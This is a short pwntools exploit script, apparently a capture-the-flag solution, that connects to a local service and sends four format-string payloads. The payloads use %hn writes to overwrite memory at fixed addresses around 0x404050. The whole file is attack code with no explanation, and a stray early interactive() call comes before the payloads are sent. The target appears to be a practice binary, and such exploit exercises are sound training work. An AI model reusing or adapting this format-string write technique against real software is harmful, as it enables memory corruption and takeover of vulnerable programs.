from pwn import *

#p = process('./binary')

p = remote('127.0.0.1', 33888)

p.recvuntil('american boy:\n')

p.interactive()

ex = '%48879p%20$hn%8126p%21$hn'
ex = ex + 'A'*(112-len(ex))
ex = ex + p64(0x0000000000404068)
ex = ex + p64(0x0000000000404068+2)
p.send(ex)

ex = '%47806p%20$hn%4160p%21$hn'
ex = ex + 'A'*(112-len(ex))
ex = ex + p64(0x0000000000404060)
ex = ex + p64(0x0000000000404060+2)
p.send(ex)

ex = '%43962p%20$hn%21$hn'
ex = ex + 'A'*(112-len(ex))
ex = ex + p64(0x0000000000404058)
ex = ex + p64(0x0000000000404058+2)
p.send(ex)

ex = '%16705p%20$hn%21$hn'
ex = ex + 'A'*(112-len(ex))
ex = ex + p64(0x0000000000404050)
ex = ex + p64(0x0000000000404050+2)
p.send(ex)

p.interactive()
